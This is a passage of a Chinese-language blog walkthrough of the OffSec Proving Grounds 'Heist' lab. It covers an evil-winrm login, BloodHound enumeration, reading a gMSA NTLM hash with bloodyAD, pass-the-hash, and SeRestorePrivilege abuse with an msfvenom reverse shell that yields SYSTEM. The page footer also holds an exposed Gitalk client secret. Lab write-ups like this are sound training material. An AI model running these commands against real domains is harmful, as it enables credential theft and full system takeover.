2021</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 3249419 blocks available</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> heist.offsec</span><br><span class="line">smb: \heist.offsec\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Jul 20 19:07:47 2021</span><br><span class="line">  ..                                  D        0  Tue Jul 20 19:07:47 2021</span><br><span class="line">  DfsrPrivate                      DHSr        0  Tue Jul 20 19:07:47 2021</span><br><span class="line">  Policies                            D        0  Tue Jul 20 19:01:30 2021</span><br><span class="line">  scripts                             D        0  Tue Jul 20 19:01:21 2021</span><br></pre></td></tr></table></figure>
+
+<p>evil-winrm 登录成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 192.168.149.165 -u enox -p california</span><br><span class="line">                                      </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                      </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                      </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                      </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\enox\Documents&gt; <span class="built_in">ls</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\enox\Documents&gt; <span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure>
+
+<h1 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h1><p>在enox&#x2F;desktop文件夹下发现todo.txt</p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-12.png.png"></p>
+<p>然后在&#x2F;users 目录下发现有svc_apache$用户，可能是一个利用点</p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-5.png.png"></p>
+<p>常规收集enox用户权限、运行进程、serivce都没有收货，运行winpeas一样没有得到提权有用的信息。不过既然是AD，就要上传SharpHound.ps1收集一下域相关信息</p>
+<h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\enox&gt; . .\sharphound.ps1</span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\enox&gt; invoke-bloodhound -collectionmethod all -outputprefix <span class="string">&quot;audit&quot;</span> -outputdirectory <span class="string">&quot;/users/enox&quot;</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\enox&gt; download audit_20250303064734_BloodHound.zip</span><br><span class="line">                                      </span><br><span class="line">Info: Downloading C:\Users\enox\audit_20250303064734_BloodHound.zip to audit_20250303064734_BloodHound.zip</span><br><span class="line">                                      </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://thiiiiink.com/202508/asynccode-4.png.png"></p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-7.png.png"></p>
+<h2 id="ReadGMSAPassword"><a href="#ReadGMSAPassword" class="headerlink" title="ReadGMSAPassword"></a>ReadGMSAPassword</h2><p>BloodHound 中看到enox用户所属WEB ADMINS有对SVC_APACH$有ReadGMSAPassword权限</p>
+<blockquote>
+<p>“ReadGMSAPassword”通常指的是一种权限或能力，允许某个账户读取Active Directory中组管理服务账户（gMSA）的密码。gMSA是Windows Server 2012引入的一种特殊服务账户类型，用于自动化密码管理，广泛应用于域环境中的服务和应用程序。</p>
+<p><strong>gMSA的特点</strong>：</p>
+<p>密码由域控制器（DC）自动生成和管理（240字节随机密码）。</p>
+<p>默认每30天自动轮换一次（可配置）。</p>
+<p>允许多台主机使用同一账户运行服务，解决了传统MSA（Managed Service Account）只能绑定单机的限制。</p>
+<p>密码存储在AD对象的 msDS-ManagedPassword 属性中。</p>
+<p><strong>ReadGMSAPassword 的含义</strong>：</p>
+<p>在AD中，gMSA的密码访问权限由 msDS-GroupMSAMembership 属性控制，该属性定义了哪些安全主体（用户、组或计算机）可以读取密码。</p>
+<p>如果一个账户拥有“ReadGMSAPassword”权限（通常表现为 RIGHT_DS_READ_PROPERTY 访问控制权限），它可以提取gMSA的当前密码。</p>
+</blockquote>
+<p>那么接下来就是获取svc_apache$的密码信息了</p>
+<p>测试bloodhound中给出的<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/micahvandeusen/gMSADumper">gMSADumper.py</a>, 执行后只是列出来who can read， 这些是我们已经知道的了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python gMSADumper.py -u enox -p california -d heist.offsec</span><br><span class="line">Unable to start a TLS connection. Is LDAPS enabled? Only ACLs will be listed and not ms-DS-ManagedPassword.</span><br><span class="line"></span><br><span class="line">Users or <span class="built_in">groups</span> <span class="built_in">who</span> can <span class="built_in">read</span> password <span class="keyword">for</span> svc_apache$:</span><br><span class="line"> &gt; DC01$</span><br><span class="line"> &gt; Web Admins</span><br><span class="line">               </span><br></pre></td></tr></table></figure>
+
+<p>搜索一下 <code>readgmsa password</code>找到下面的链接：</p>
+<p><code>https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword</code></p>
+<blockquote>
+<p>bloodyAD： <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/CravateRouge/bloodyAD">https://github.com/CravateRouge/bloodyAD</a></p>
+</blockquote>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-8.png.png"></p>
+<p>成功读取到ntlm hash:<code>0c43e5ad6bc9104cfb94d56f4aecb4ab</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./bloodyAD.py --host 192.168.149.165 -d heist.offsec -u enox -p california get object svc_apache$ --attr msDS-ManagedPassword</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec</span><br><span class="line">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:0c43e5ad6bc9104cfb94d56f4aecb4ab</span><br><span class="line">msDS-ManagedPassword.B64ENCODED: b8iUgZTAehetubX0QcQQoLkmMSjGS7MXKpta94CcZvY4hej/0kCetCW0BVRtyfpubMbV/SECcA0VvsH2dvzZjsna1RLixNOQEedehbIpHdPFmvVcgwl30oBm2/+HJ8p0ox2VYjB/bjTx3VLiInMHzriTIlFLAL/j7feKC383nDPSpyUnfza62KJFYBHcQA//XGJ9rcl33pTN1IdYeEpzOcNzmca2QRdtIbBLpDTsRceO0qafC8a1yYkDtmfC1JmZxG9T3BopaW8Xl1Jjc1hTUDr9rAtGuUCSDCrTY50hI2B9HzkMXoAzPVz0L7amoE0X4QPNtGWDrM4+fg3//AUARw==</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+<h2 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h2><p>查看svc_apache$权限： SeRestorePrivilege</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">evil<span class="operator">-</span>winrm <span class="operator">-</span>i <span class="number">192.168</span><span class="number">.149</span><span class="number">.165</span> <span class="operator">-</span>u &quot;svc_apache$&quot; <span class="operator">-</span>H &quot;0c43e5ad6bc9104cfb94d56f4aecb4ab&quot;</span><br><span class="line">                                      </span><br><span class="line">Evil<span class="operator">-</span>WinRM shell v3<span class="number">.5</span></span><br><span class="line">                                      </span><br><span class="line">Warning: Remote path completions <span class="keyword">is</span> disabled due <span class="keyword">to</span> ruby limitation: quoting_detection_proc() <span class="keyword">function</span> <span class="keyword">is</span> unimplemented <span class="keyword">on</span> this machine</span><br><span class="line">                                      </span><br><span class="line">Data: <span class="keyword">For</span> more information, <span class="keyword">check</span> Evil<span class="operator">-</span>WinRM GitHub: https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>Hackplayers<span class="operator">/</span>evil<span class="operator">-</span>winrm#Remote<span class="operator">-</span>path<span class="operator">-</span>completion</span><br><span class="line">                                      </span><br><span class="line">Info: Establishing connection <span class="keyword">to</span> remote endpoint</span><br><span class="line"><span class="operator">*</span>Evil<span class="operator">-</span>WinRM<span class="operator">*</span> PS C:\Users\svc_apache$\Documents<span class="operator">&gt;</span> ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\svc_apache$\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="comment">----                -------------         ------ ----</span></span><br><span class="line"><span class="operator">-</span>a<span class="comment">----        9/14/2021   8:27 AM           3213 EnableSeRestorePrivilege.ps1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">*</span>Evil<span class="operator">-</span>WinRM<span class="operator">*</span> PS C:\Users\svc_apache$\Documents<span class="operator">&gt;</span> whoami <span class="operator">/</span>priv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="comment">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">SeMachineAccountPrivilege     <span class="keyword">Add</span> workstations <span class="keyword">to</span> domain     Enabled</span><br><span class="line">SeRestorePrivilege            Restore files <span class="keyword">and</span> directories  Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="keyword">set</span> Enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="SeRestorPrivilege"><a href="#SeRestorPrivilege" class="headerlink" title="SeRestorPrivilege"></a>SeRestorPrivilege</h2><blockquote>
+<p>SeRestorePrivilege 是 Windows 操作系统中的一种特权（Privilege），全称是 **”Restore files and directories”**（恢复文件和目录）。它属于安全特权的一部分，通常由系统管理员或高权限账户持有，用于执行涉及系统级恢复或修改的操作。</p>
+<ul>
+<li>通常授予 <strong>Administrators</strong> 组（本地管理员）。</li>
+<li>在域环境中，可能由 <strong>Domain Admins</strong> 或特定服务账户（如备份服务）持有。</li>
+<li>默认情况下，非管理员用户不具备此特权。</li>
+</ul>
+<p>可以做什么：</p>
+<ol>
+<li><p><strong>绕过文件权限</strong>：</p>
+<ol start="2">
+<li>无视文件或目录的ACL，直接写入或覆盖内容。</li>
+<li>示例：即使文件只允许“SYSTEM”写入，拥有此特权的用户也能修改它。</li>
+</ol>
+</li>
+<li><p><strong>修改注册表</strong>：</p>
+<ol start="3">
+<li>包括受限的注册表键（如 HKEY_LOCAL_MACHINE\SAM、HKEY_LOCAL_MACHINE\SECURITY）。</li>
+<li>可用于添加用户、修改权限等。</li>
+</ol>
+</li>
+<li><p><strong>还原备份</strong>：</p>
+<ol start="4">
+<li>与备份工具（如 Windows Server Backup）配合，恢复系统文件或数据。</li>
+</ol>
+</li>
+</ol>
+</blockquote>
+<p>简而言之： 拥有修改系统文件权限</p>
+<p>利用SeRestoreAbuse.exe执行反弹shell， 成功得到管理员shell</p>
+<blockquote>
+<p><code>SeRestoreAbuse:``https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe</code></p>
+</blockquote>
+<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o r.exe</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_apache<span class="variable">$</span>&gt; upload SeRestoreAbuse.exe</span><br><span class="line">                                      </span><br><span class="line">Info: Uploading /home/kali/Tools/pg/Heist/SeRestoreAbuse.exe to C:\Users\svc_apache<span class="variable">$</span>\SeRestoreAbuse.exe</span><br><span class="line">                                      </span><br><span class="line"><span class="keyword">Data</span>: <span class="number">22528</span> bytes of <span class="number">22528</span> bytes copied</span><br><span class="line">                                      </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_apache<span class="variable">$</span>&gt; upload r.exe</span><br><span class="line">                                      </span><br><span class="line">Info: Uploading /home/kali/Tools/pg/Heist/r.exe to C:\Users\svc_apache<span class="variable">$</span>\r.exe</span><br><span class="line">                                      </span><br><span class="line"><span class="keyword">Data</span>: <span class="number">9556</span> bytes of <span class="number">9556</span> bytes copied</span><br><span class="line">                                      </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_apache<span class="variable">$</span>&gt; .\SeRestoreAbuse.exe C:\Users\svc_apache<span class="variable">$</span>\r.exe</span><br><span class="line">RegCreateKeyExA result: <span class="number">0</span></span><br><span class="line">RegSetValueExA result: <span class="number">0</span></span><br><span class="line">SeRestoreAbuse.exe : <span class="built_in">start-service</span> : Service <span class="string">&#x27;Secondary Logon (seclogon)&#x27;</span> cannot be started due to the following error: Cannot <span class="built_in">start</span> </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc <span class="operator">-</span>nvlp <span class="number">443</span></span><br><span class="line">listening <span class="keyword">on</span> [<span class="keyword">any</span>] <span class="number">443</span> ...</span><br><span class="line"><span class="keyword">connect</span> <span class="keyword">to</span> [<span class="number">192.168</span><span class="number">.45</span><span class="number">.165</span>] <span class="keyword">from</span> (<span class="literal">UNKNOWN</span>) [<span class="number">192.168</span><span class="number">.149</span><span class="number">.165</span>] <span class="number">52353</span></span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.2061</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. <span class="keyword">All</span> rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32<span class="operator">&gt;</span>whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\<span class="keyword">system</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Yiaos
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://www.thiiiiink.com/post/20250304004106.html" title="Proving Grounds Practice - Heist">https://www.thiiiiink.com/post/20250304004106.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/20250311021811.html" rel="prev" title="PHP Wrapper 利用">
+      <i class="fa fa-chevron-left"></i> PHP Wrapper 利用
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/20250303001229.html" rel="next" title="Proving Grounds Practice - Medjed">
+      Proving Grounds Practice - Medjed <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Difficulty"><span class="nav-text">Difficulty</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Scan"><span class="nav-text">Scan</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#autorecon-192-168-149-165"><span class="nav-text">autorecon 192.168.149.165</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#domain-dig"><span class="nav-text">domain dig</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rpcclient"><span class="nav-text">rpcclient</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smbclient"><span class="nav-text">smbclient</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ldapsearch"><span class="nav-text">ldapsearch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8080"><span class="nav-text">8080</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#whatweb"><span class="nav-text">whatweb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gobuster"><span class="nav-text">gobuster</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssrf-vuln"><span class="nav-text">ssrf vuln</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Foothold"><span class="nav-text">Foothold</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Responder"><span class="nav-text">Responder</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Escalation"><span class="nav-text">Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bloodhound"><span class="nav-text">bloodhound</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ReadGMSAPassword"><span class="nav-text">ReadGMSAPassword</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-The-Hash"><span class="nav-text">Pass The Hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SeRestorPrivilege"><span class="nav-text">SeRestorPrivilege</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Yiaos</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yiaos</span>
+</div>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23lioxBWzEMyWt1JhD',
+      clientSecret: '6d63e8f9065e954d63e6a90407d40a3ccee85f0e',
+      repo        : 'Yiaos.github.io',
+      owner       : 'Yiaos',
+      admin       : ['Yiaos'],
+      id          : '4fec76663ef9c505b1b052172018dfee',
+        language: 'en',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
